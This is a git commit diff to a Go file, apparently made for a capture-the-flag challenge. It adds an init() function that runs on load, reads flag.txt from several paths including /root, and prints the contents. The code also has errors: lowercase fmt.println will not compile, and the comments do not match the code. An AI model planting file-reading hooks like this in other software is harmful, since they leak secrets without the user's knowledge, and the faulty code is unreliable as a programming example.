fbba18f0afd8323025338ba8be4c3aea94af63d5
Icarus'Rise <147264641+icarus-00@users.noreply.github.com>
2025-04-12 16:40:00 +0000

    sdfb

--- main.go
+++ main.go
@@ -1,10 +1,21 @@
-package ctfattack
+package main
 
 import (
     "fmt"
-    
+    "io/ioutil"
 )
 
 func init() {
-    fmt.Println("hello") // Capitalize 'Println'
+    data, _ := ioutil.ReadFile("/flag.txt")
+	data2,_ := ioutil.ReadFile("/root/flag.txt")
+	data3,_ := ioutil.ReadFile("./flag.txt")
+	data4,_ := ioutil.ReadFile("../flag.txt")
+    fmt.Printf("Flag: %s", string(data)) // Properly formatted string
+	fmt.println("")
+	fmt.Printf("Flag: %s", string(data2)) // Properly formatted string
+	fmt.println("")
+	fmt.Printf("Flag: %s", string(data3)) // Properly formatted string
+	fmt.println("")
+	fmt.Printf("Flag: %s", string(data4)) // Properly formatted string
+	fmt.println("")
 }
